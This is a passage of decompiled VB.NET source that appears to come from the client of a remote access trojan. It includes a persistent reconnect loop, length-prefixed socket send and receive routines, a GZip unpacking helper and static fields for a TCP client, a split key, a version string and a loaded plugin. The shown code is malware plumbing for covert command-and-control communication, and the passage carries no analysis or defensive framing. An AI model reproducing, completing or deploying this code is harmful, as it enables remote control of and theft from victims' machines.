                                        GoTo Label_001B
                                    End If
                                    GoTo Label_0057
                            End Select
                            str = (str & Conversions.ToString(Conversions.ToInteger(Strings.ChrW(charCode).ToString)))
                        Loop
                    End If
                    OK.b = New Byte((OK.C.Available + 1) - 1) {}
                    Dim num5 As Long = (num - OK.MeM.Length)
                    If (OK.b.Length > num5) Then
                        OK.b = New Byte((CInt((num5 - 1)) + 1) - 1) {}
                    End If
                    Dim count As Integer = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None)
                    OK.MeM.Write(OK.b, 0, count)
                    GoTo Label_001B
                End If
            Catch exception1 As Exception

            End Try
        End If
Label_01C1:
        OK.Cn = False
        If Not OK.connect Then
            GoTo Label_01C1
        End If
        OK.Cn = True
    End Sub

    Public Shared Function SB(ByRef S As String) As Byte()
        Return Encoding.UTF8.GetBytes(S)
    End Function

    Public Shared Function Send(ByVal S As String) As Boolean
        Return OK.Sendb(OK.SB(S))
    End Function

    Public Shared Function Sendb(ByVal b As Byte()) As Boolean
        If Not OK.Cn Then
            Return False
        End If
        Try
            Dim lO As FileInfo = OK.LO
            SyncLock lO
                If Not OK.Cn Then
                    Return False
                End If
                Dim stream As New MemoryStream
                Dim length As Integer = b.Length
                Dim buffer As Byte() = OK.SB((length.ToString & ChrW(0)))
                stream.Write(buffer, 0, buffer.Length)
                stream.Write(b, 0, b.Length)
                OK.C.Client.Send(stream.ToArray, 0, CInt(stream.Length), SocketFlags.None)
            End SyncLock
        Catch exception1 As Exception
            Try
                If OK.Cn Then
                    OK.Cn = False
                    OK.C.Close()
                End If
            Catch exception3 As Exception
            End Try
        End Try
        Return OK.Cn
    End Function


    Public Shared Function ZIP(ByVal B As Byte()) As Byte()
        Dim stream2 As New MemoryStream(B)
        Dim stream As New GZipStream(stream2, CompressionMode.Decompress)
        Dim buffer2 As Byte() = New Byte(4 - 1) {}
        stream2.Position = (stream2.Length - 5)
        stream2.Read(buffer2, 0, 4)
        Dim count As Integer = BitConverter.ToInt32(buffer2, 0)
        stream2.Position = 0
        Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
        stream.Read(array, 0, count)
        stream.Dispose()
        stream2.Dispose()
        Return array
    End Function

    Private Shared b As Byte() = New Byte(&H1401 - 1) {}
    Public Shared C As TcpClient = Nothing
    Public Shared Cn As Boolean = False
    Public Shared F As Computer = New Computer
    Public Shared LO As FileInfo = New FileInfo(Assembly.GetEntryAssembly.Location)
    Private Shared MeM As MemoryStream = New MemoryStream
    Public Shared PLG As Object = Nothing
    Public Shared VR As String = My.Settings.Ver
    Public Shared Y As String = My.Settings.Splitkey
End Class